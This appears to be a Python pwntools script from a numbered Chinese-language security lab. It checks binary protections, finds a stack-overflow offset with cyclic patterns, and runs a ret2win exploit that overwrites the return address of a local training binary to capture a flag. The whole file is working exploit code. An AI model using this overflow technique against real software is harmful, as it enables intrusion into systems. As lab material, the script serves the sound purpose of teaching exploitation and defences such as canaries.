#!/usr/bin/env python3
# =============================================================================
# 25 · 栈溢出利用工具（宿主侧 pwntools）：
#   --checksec                      防护体检：对比两个编译版本开了哪些保护
#   --gen-cyclic FILE               生成 200 字节 cyclic 模式（供 gdb 定位偏移）
#   --find-offset 0x...             由崩溃现场的 x30（返回地址）反查偏移
#   --attack --port PORT [...]      完整利用：填充 + 覆写返回地址 → ret2win
#   依赖: pip3 install pwntools；靶场由 stack_lab.sh 起在 127.0.0.1
# =============================================================================
import argparse
import re
import sys

from pwn import ELF, context, cyclic, cyclic_find, p64, remote

context.log_level = "error"  # 输出干净、可逐字对账

FLAG_RE = re.compile(rb"HOSEC25\{[^}]+\}")


def nx_from_segments(elf):
    """NX 直接读 PT_GNU_STACK 段的可执行位（pwntools 的 nx 在可执行栈时返回 None，语义含糊）"""
    for seg in elf.iter_segments():
        if seg.header.p_type == "PT_GNU_STACK":
            return "False" if seg.header.p_flags & 1 else "True"
    return "None"


def do_checksec(vuln, canary):
    print("防护体检（pwntools 读 ELF 属性；NX 看 PT_GNU_STACK 段）：")
    for path in (vuln, canary):
        elf = ELF(path)
        print(f"  {path:<24}canary={str(elf.canary):<7}nx={nx_from_segments(elf):<7}"
              f"pie={str(elf.pie):<7}relro={elf.relro}")


def do_gen_cyclic(path):
    pattern = cyclic(200)
    with open(path, "w") as f:
        f.write(pattern.decode())
    print(f"cyclic(200) 已写入 {path}")
    print(f"  头部 {pattern[:8].decode()} … 尾部 {pattern[-8:].decode()}（每 8 字节片段全文件唯一）")


def do_find_offset(hexval):
    value = int(hexval, 16)
    offset = cyclic_find(value)
    if offset < 0:
        print(f"x30 = {hexval} 不在 cyclic 模式里——pattern 或输入有问题", file=sys.stderr)
        sys.exit(1)
    print(f"崩溃现场 x30 = {hexval}（pattern 片段，说明返回地址被这批字节覆盖）")
    print(f"偏移 = {offset}")


def do_attack(args):
    elf = ELF(args.vuln)
    win = elf.symbols["win"]
    print(f"目标 {args.vuln}：win() = {hex(win)}（-no-pie 下地址固定，白捡的靶点）")
    payload = cyclic(args.offset) + p64(win)
    print(f"payload = {args.offset} 字节填充 + p64(win)，共 {len(payload)} 字节")
    io = remote("127.0.0.1", args.port)
    io.recvuntil(b"input:", timeout=8)
    io.sendline(payload)
    data = io.recvall(timeout=5)
    io.close()
    print("靶场回复：")
    for line in data.decode(errors="replace").strip("\n").splitlines():
        print(f"    {line}")
    found = FLAG_RE.search(data)
    if args.expect == "flag":
        if not found:
            print("未拿到 flag——利用失败", file=sys.stderr)
            sys.exit(1)
        print(f"拿到 flag：{found.group().decode()}")
    else:
        if found:
            print("竟然拿到了 flag——对照失败", file=sys.stderr)
            sys.exit(1)
        print("未拿到 flag——覆写被挡在函数返回之前")


def main():
    p = argparse.ArgumentParser(description="25 · 栈溢出利用工具（ret2win）")
    p.add_argument("--checksec", action="store_true", help="打印两个二进制开启的防护")
    p.add_argument("--gen-cyclic", metavar="FILE", help="生成 200 字节 cyclic 到 FILE")
    p.add_argument("--find-offset", metavar="0xHEX", help="由崩溃时 x30 的值反查偏移")
    p.add_argument("--attack", action="store_true", help="执行 ret2win 攻击")
    p.add_argument("--port", type=int, default=9025, help="靶场端口（默认 9025）")
    p.add_argument("--vuln", default="artifacts/vuln", help="目标二进制（默认 artifacts/vuln）")
    p.add_argument("--canary", default="artifacts/vuln-canary", help="--checksec 用的加固版路径")
    p.add_argument("--offset", type=int, default=72, help="到返回地址的偏移（默认 72）")
    p.add_argument("--expect", choices=["flag", "fail"], default="flag",
                   help="预期结果：flag=必须拿到；fail=必须拿不到（canary 对照）")
    args = p.parse_args()

    if args.checksec:
        do_checksec(args.vuln, args.canary)
    elif args.gen_cyclic:
        do_gen_cyclic(args.gen_cyclic)
    elif args.find_offset:
        do_find_offset(args.find_offset)
    else:
        do_attack(args)


if __name__ == "__main__":
    main()
